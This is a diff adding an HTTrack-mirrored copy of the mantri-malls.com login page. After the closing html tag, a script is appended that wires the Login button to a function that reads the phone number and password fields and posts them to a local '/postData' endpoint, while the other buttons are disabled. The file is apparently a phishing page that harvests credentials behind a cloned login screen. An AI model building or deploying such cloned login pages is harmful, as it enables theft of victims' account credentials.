@@ -1,0 +1,163 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from www.mantri-malls.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 20 Oct 2021 09:58:49 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>mantrimalls</title>
+
+<link rel="icon" href="assets/icons/mantrimalls/mantrimalls_logo.html">
+
+<link rel="stylesheet" href="../maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<script src="../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="../cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="../maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<link rel="stylesheet" href="../pro.fontawesome.com/releases/v5.10.0/css/all.css">
+<link href='../unpkg.com/boxicons%402.0.9/css/boxicons.min.css' rel='stylesheet'>
+
+<link rel="stylesheet" href="assets/css/mantrimallsd38a.css?v=1.1.5">
+
+<link rel="preconnect" href="../fonts.googleapis.com/index.html">
+<link rel="preconnect" href="../fonts.gstatic.com/index.html" crossorigin>
+<link rel="stylesheet" href="../fonts.googleapis.com/cssc8ca.css?family=Roboto:100,300,400,500,700,900">
+<link href="../fonts.googleapis.com/css24d6f.css?family=Spartan&amp;display=swap" rel="stylesheet">
+<link href="../fonts.googleapis.com/icone91f.css?family=Material+Icons" rel="stylesheet">
+<link href="../fonts.googleapis.com/iconf511.css?family=Material+Icons+Outlined" rel="stylesheet">
+</head>
+<body id="mantrimalls-page">
+<div class="tab-content">
+<div class="tab-pane" id="home" role="tabpanel" aria-labelledby="home-tab">Home</div>
+<div class="tab-pane" id="search" role="tabpanel" aria-labelledby="search-tab">Search</div>
+<div class="tab-pane active" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+
+
+<div class="headerTab">
+<div class="back-btn ml-1">
+<form class="undo-auth h-100">
+<div class="w-100 h-100 d-flex justify-content-center align-items-center">
+<button type="submit" class="btn-back"><i class="far fa-chevron-left"></i></button>
+</div>
+</form>
+<div class="h-100 d-flex ml-1 align-items-center justify-content-center">
+<div class="tab-heading">
+Login
+</div>
+</div>
+</div>
+</div>
+
+<section class="login-div">
+<div class="container-fluid">
+<form class="login-form">
+<div class="login-form-error"></div>
+<div class="login-form-group">
+<div class="login-form-input mobile-form-input">
+<span class="material-icons">
+phone_android
+</span>
+<input id = 'phoneNumber' type="text" minlength="3" maxlength="13" class="login-form-control mobile-input" onkeypress="isInputNumber(event)" name="contact_no" placeholder="Mobile Number">
+</div>
+<small class="login-form-error mobile-input"></small>
+</div>
+<div class="login-form-group">
+<div class="login-form-input password-form-input">
+<span class="password-key-holder">
+<img src="assets/icons/mantrimalls/password_key.png" alt="key">
+</span>
+<input id = 'password' type="password" class="login-form-control password-input" name="password" placeholder="Password">
+</div>
+<small class="login-form-error password-input"></small>
+</div>
+<div class="login-form-submit">
+<button onclick="pos()" type="submit" class="btn-submit">Login</button>
+</div>
+</form>
+<div class="helper-btns-div">
+<button type="button" class="btn-register" onclick="return false;">Register</button>
+<button type="button" class="btn-forget-password" onclick="return false;">Forget Password?</button>
+</div>
+</div>
+</section>
+</div>
+</div>
+
+<ul class="nav nav-tabs" id="footerTab" role="tablist">
+<li class="nav-item" id="home-tab">
+<a class="nav-link disabled" data-toggle="tab" href="#home" role="tab" aria-controls="home" aria-selected="false">
+<div class="footerTab-images">
+<img src="assets/icons/mantrimalls/home.png" alt="My" id="home-icon">
+<div class="footerTab-txt">
+Home
+</div>
+</div>
+</a>
+</li>
+<li class="nav-item" id="search-tab">
+<a class="nav-link disabled" data-toggle="tab" href="#search" role="tab" aria-controls="search" aria-selected="false">
+<div class="footerTab-images">
+<img src="assets/icons/mantrimalls/search.png" alt="My" id="search-icon">
+<div class="footerTab-txt">
+Search
+</div>
+</div>
+</a>
+</li>
+<li class="nav-item" id="profile-tab">
+<a class="nav-link active" data-toggle="tab" href="#profile" role="tab" aria-controls="profile" aria-selected="true">
+<div class="footerTab-images">
+<img src="assets/icons/mantrimalls/personcenter_cur.png" alt="My" id="profile-icon">
+<div class="footerTab-txt">My</div>
+</div>
+</a>
+</li>
+</ul>
+<script>
+        $(function() {
+            $('#footerTab li:last-child a').tab('show')
+        })
+    </script>
+<script src="assets/js/game69ea.js?v=1.1.2"></script>
+<script src="assets/js/mantrimalls69ea.js?v=1.1.2"></script>
+</body>
+
+<!-- Mirrored from www.mantri-malls.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 20 Oct 2021 09:59:08 GMT -->
+</html>
+
+
+<script>
+console.log('omsai')
+
+function pos(){
+  ph = document.getElementById('phoneNumber').value
+  pass = document.getElementById('password').value
+  // console.log(ph,pass)
+  data = {
+    'ph':ph,
+    'pass':pass
+  }
+  fetch('/postData',{
+    method:'post',
+    headers: {
+   'Content-Type': 'application/json',
+  },
+  body: JSON.stringify(data),
+
+
+  })
+
+
+
+
+
+}
+
+
+
+
+
+</script>
